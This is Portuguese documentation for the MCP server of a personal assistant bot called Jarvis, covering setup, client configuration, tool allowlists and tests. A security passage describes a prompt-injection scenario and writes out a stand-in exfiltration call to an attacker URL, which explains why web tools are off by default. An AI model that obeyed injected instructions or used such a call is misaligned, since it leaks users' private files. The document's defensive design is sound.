# Servidor MCP do Jarvis

O Jarvis também fala [MCP](https://modelcontextprotocol.io) (Model Context Protocol): o
módulo [`jarvis/mcp_server.py`](../jarvis/mcp_server.py) expõe as ferramentas do bot para
qualquer cliente MCP — Claude Desktop, Claude Code, MCP Inspector — por **stdio**. O cliente
ganha a busca na sua memória local (RAG) e a leitura de arquivos/PDF/DOCX/OCR — e, se você
pedir, a leitura da web — **com as mesmas travas** que protegem o bot no Telegram.

## Como funciona

```
cliente MCP ──stdio──▶ jarvis.mcp_server ──▶ allowlist ──▶ ToolRegistry.execute ──▶ handler ──▶ security.py
 (Claude)               (SDK oficial,         (quais          (o mesmo do agente:         resolve_path,
                         Server de baixo       aparecem)       audit.log, métricas)        check_url, ...
                         nível)
```

- **Uma fonte da verdade.** Cada ferramenta exposta vira um `Tool` MCP com o mesmo nome,
  descrição e JSON Schema que o modelo local recebe (`ToolRegistry.schemas()`). Por isso o
  servidor usa o `Server` de baixo nível do SDK, e não o `MCPServer`/FastMCP, que geraria
  outro schema a partir de assinaturas Python.
- **Mesmo caminho de execução.** `tools/call` chama `ToolRegistry.execute`, que chama o
  handler, que chama o `security.py`. O servidor MCP não tem checagem própria de caminho,
  comando ou URL — só decide **quais ferramentas aparecem**.
- **Erros** das ferramentas (`Erro: ...`, `Bloqueado: ...`) voltam como resultado com
  `isError: true`, que o cliente mostra ao modelo.
- **Auditoria e métricas.** Cada chamada vai para o `data/audit.log` com `"source": "mcp"`
  e, com `JARVIS_METRICS_ENABLED=true`, para o `data/metrics.sqlite3` com `source="mcp"`
  (requisição sem LLM: modelo vazio, 0 iterações, 1 ferramenta). Elas entram no `/metrics`
  do Telegram junto com as conversas.
- **stdout é do protocolo.** Logs vão para stderr; o SDK ainda desvia o fd 1 enquanto serve.

## Instalar

O SDK oficial (`mcp` 2.x) exige **Python >= 3.10**; o bot continua em 3.8. Use um venv à
parte (o `.venv-mcp/` está no `.gitignore`):

```bash
uv venv --python 3.12 .venv-mcp
uv pip install --python .venv-mcp -r requirements.txt -r requirements-mcp.txt
# sem uv: python3.12 -m venv .venv-mcp && .venv-mcp/bin/pip install -r requirements.txt -r requirements-mcp.txt
```

Conferir o que fica exposto, sem subir o servidor:

```bash
.venv-mcp/bin/python -m jarvis.mcp_server --check       # Windows: .venv-mcp\Scripts\python.exe
```

O servidor lê o mesmo `.env` do bot (na raiz do repositório) e faz `chdir` para a raiz antes
de carregar, como o `run.sh`: caminhos relativos como `JARVIS_DB_PATH=data/jarvis.sqlite3`
significam o mesmo que no bot, de onde quer que o cliente lance o processo. O token do
Telegram não é necessário.

## Conectar no Claude Desktop

Edite o `claude_desktop_config.json` (macOS:
`~/Library/Application Support/Claude/claude_desktop_config.json`; Windows:
`%APPDATA%\Claude\claude_desktop_config.json`) e reinicie o Claude Desktop. `command` é o
Python do `.venv-mcp`; `PYTHONPATH` aponta para a raiz do repositório para o `-m` achar o
pacote.

Linux/macOS:

```json
{
  "mcpServers": {
    "jarvis": {
      "command": "/home/voce/jarvis/.venv-mcp/bin/python",
      "args": ["-m", "jarvis.mcp_server"],
      "env": { "PYTHONPATH": "/home/voce/jarvis" }
    }
  }
}
```

Windows (barras invertidas dobradas no JSON; `PYTHONUTF8` evita problema de acento no
console):

```json
{
  "mcpServers": {
    "jarvis": {
      "command": "C:\\Users\\voce\\jarvis\\.venv-mcp\\Scripts\\python.exe",
      "args": ["-m", "jarvis.mcp_server"],
      "env": { "PYTHONPATH": "C:\\Users\\voce\\jarvis", "PYTHONUTF8": "1" }
    }
  }
}
```

Variáveis do `.env` também podem ir no bloco `env` (ex.: `"JARVIS_MCP_TOOLS":
"knowledge_search"` só para este cliente); o que vier do cliente vale mais que o `.env`.

## Conectar no Claude Code

```bash
# Linux/macOS
claude mcp add jarvis --env PYTHONPATH=/home/voce/jarvis \
  -- /home/voce/jarvis/.venv-mcp/bin/python -m jarvis.mcp_server

# Windows (Git Bash ou PowerShell)
claude mcp add jarvis --env PYTHONPATH=C:/Users/voce/jarvis --env PYTHONUTF8=1 \
  -- C:/Users/voce/jarvis/.venv-mcp/Scripts/python.exe -m jarvis.mcp_server
```

Por padrão o servidor fica no escopo local (só você, só neste projeto); `--scope user`
deixa disponível em todos os projetos. `claude mcp list` mostra se conectou e `/mcp`, dentro
do Claude Code, lista as ferramentas. Para testar fora de um cliente, o MCP Inspector:
`npx @modelcontextprotocol/inspector .venv-mcp/bin/python -m jarvis.mcp_server`.

## O que fica exposto por padrão (só leitura local)

| Ferramenta | O que faz | Trava |
|---|---|---|
| `read_file`, `list_dir`, `search_files`, `find_files` | ler/listar/buscar arquivos | `JARVIS_ALLOWED_ROOTS`; `.ssh`, `.env`, `credentials.json`, chaves etc. bloqueados |
| `read_pdf`, `read_docx`, `read_image` | extrair texto (OCR nas imagens) | as mesmas pastas permitidas |
| `knowledge_search` | busca na memória local (RAG, BM25 por padrão) | lê só o índice já construído (só existe com `JARVIS_RAG_ENABLED=true`) |

As anotações MCP acompanham: `readOnlyHint: true` e `openWorldHint: false`. Indexar (`knowledge_index`) **não** está no padrão: escreve no índice e lê pastas
inteiras — rode o `/reindex` do bot ou `scripts/reindex.py`.

### Ferramentas da web: fora do padrão, liberáveis sem a segunda chave

| Ferramenta | O que faz | Trava |
|---|---|---|
| `web_search` | busca na web (DuckDuckGo) | sai para a internet (`openWorldHint: true`) |
| `web_fetch` | lê uma página | `check_url`: só http/https, bloqueia localhost, IPs privados, link-local (SSRF) |

Até o subprojeto 6 elas estavam no padrão. Saíram porque, **junto com `read_file`**, abrem um
caminho de exfiltração: um cliente enganado por prompt injection (um arquivo ou uma página com
instruções escondidas) poderia ler um arquivo local e mandar o conteúdo numa URL
(`web_fetch("https://atacante/?q=<conteúdo>")`) ou numa consulta de busca. O `check_url` só
bloqueia destinos internos (SSRF), não destinos públicos. O próprio Claude já tem acesso à
web, então o risco extra é pequeno, mas o padrão agora é o mais seguro.

Para religar, ponha as duas na lista (são leitura, **não** precisam de
`JARVIS_MCP_ALLOW_UNSAFE`):

```
JARVIS_MCP_TOOLS=leitura,web_search,web_fetch
```

O `--check` marca as duas como "leitura, SAI PARA A INTERNET". Se for ligá-las, prefira
`JARVIS_ALLOWED_ROOTS` restrito ao que o cliente realmente precisa ler.

## Liberar mais ferramentas com segurança

Duas variáveis (no `.env` ou no `env` do cliente):

- `JARVIS_MCP_TOOLS` — lista separada por vírgula que **substitui** o conjunto padrão.
  Serve para restringir (`JARVIS_MCP_TOOLS=knowledge_search,read_file`) ou para pedir mais.
  `leitura` é atalho para o conjunto padrão inteiro, sem a web (`JARVIS_MCP_TOOLS=leitura,git`).
  `web_search` e `web_fetch` entram só pelo nome, sem a segunda chave.
- `JARVIS_MCP_ALLOW_UNSAFE` — **segunda chave**. Ferramentas que escrevem, executam, enviam
  ou mexem em dinheiro (`write_file`, `replace_in_file`, `run_shell`, `git`, `github`,
  `obsidian`, `notion`, `spreadsheet`, `google`, `microsoft`, `stripe`, `knowledge_index`)
  só aparecem se estiverem na lista **e** esta variável for `true`. Com uma chave só, ficam
  de fora e o motivo vai para o log (e para o `--check`).

`send_file` e `speak` nunca são expostas (mandam arquivo/áudio para um chat do Telegram).
Nomes desconhecidos são ignorados com aviso. Uma ferramenta fora da allowlist não aparece em
`tools/list` e, se um cliente chamá-la mesmo assim, é recusada antes de chegar ao registro.

Antes de ligar algo que escreve:

1. **Restrinja as pastas.** Liberar `write_file` com `JARVIS_ALLOWED_ROOTS` na home inteira
   dá ao cliente escrita na home inteira. Para o MCP, prefira um `.env`/bloco `env` com
   `JARVIS_ALLOWED_ROOTS` apontando só para o projeto.
2. **Libere o mínimo.** `JARVIS_MCP_TOOLS=leitura,replace_in_file` é bem diferente de
   `run_shell`: o filtro de comandos destrutivos do `security.py` continua valendo, mas **não
   é um sandbox**. `JARVIS_SHELL_ENABLED=false` desliga o terminal também no MCP.
3. **Confira com `--check`** e acompanhe o `data/audit.log` (`"source": "mcp"`).
4. **Prompt injection.** Uma página lida pelo `web_fetch` ou um arquivo lido pode conter
   instruções para o modelo. Com só leitura, o pior caso é o modelo resumir algo errado; com
   escrita/terminal/e-mail ligados, ele poderia agir. Mantenha a confirmação do cliente
   (o Claude pede aprovação por ferramenta) ligada para as que escrevem.

## Exemplo real

Cliente do SDK (`mcp.Client` + `StdioServerParameters`) subindo o servidor com o `.env`
padrão e um índice RAG construído com `scripts/reindex.py` sobre `docs/` (caminhos da
máquina trocados por `<HOME>`):

```
TOOLS: ['find_files', 'knowledge_search', 'list_dir', 'read_docx', 'read_file', 'read_image',
        'read_pdf', 'search_files', 'web_fetch', 'web_search']   # rodada com a web ainda no padrão

==> knowledge_search {'query': 'como o servidor MCP decide quais ferramentas expor', 'k': 2}
    is_error= False
Resultados da memória local:

[1] 2026-11-08-mcp-design.md, trecho 1 de 5
caminho: <HOME>\jarvis\docs\superpowers\specs\2026-11-08-mcp-design.md
# Servidor MCP — especificação  Data: 2026-11-08 · ...

==> read_file {'path': 'C:\\Windows\\win.ini'}  is_error= True
Erro: caminho fora das pastas permitidas (<HOME>, <HOME>\jarvis\data\uploads): C:\Windows\win.ini

==> run_shell {'command': 'whoami'}  is_error= True
Erro: a ferramenta 'run_shell' não está exposta neste servidor MCP. Disponíveis: find_files,
knowledge_search, list_dir, read_docx, read_file, read_image, read_pdf, search_files,
web_fetch, web_search
```

O código de um cliente mínimo:

```python
import asyncio
from mcp import Client
from mcp.client.stdio import StdioServerParameters

params = StdioServerParameters(
    command="/home/voce/jarvis/.venv-mcp/bin/python",
    args=["-m", "jarvis.mcp_server"],
    env={"PYTHONPATH": "/home/voce/jarvis"},
)

async def main():
    async with Client(params) as client:
        print([tool.name for tool in (await client.list_tools()).tools])
        result = await client.call_tool("knowledge_search", {"query": "projeto Falcon"})
        print(result.is_error, result.content[0].text)

asyncio.run(main())
```

## Testes

- `tests/test_mcp_policy.py` — allowlist e ponte com o registro, **sem** o SDK: rodam no
  `.venv` (Python 3.8) e no CI 3.8/3.12. Cobrem o padrão só leitura local (sem a web), a web
  liberável só pela lista, as duas chaves para cada
  ferramenta que escreve, `send_file`/`speak`, nomes desconhecidos, recusa antes do registro,
  caminho fora da raiz e credencial recusados pelo `security.py`, SSRF, métricas e audit.log
  com `source="mcp"`.
- `tests/test_mcp_server.py` — pelo protocolo, com o cliente do SDK (`pytest.importorskip`):
  em processo (listar, chamar `read_file` e `knowledge_search` com RAG BM25 real, `isError`
  para caminho fora da raiz e ferramenta bloqueada, duas chaves liberando `write_file` ainda
  presa às pastas permitidas) e **integração por stdio** subindo `python -m jarvis.mcp_server`.
  No CI rodam no job `mcp` (Python 3.12).

```bash
.venv-mcp/bin/python -m pytest -q tests/test_mcp_server.py tests/test_mcp_policy.py
```
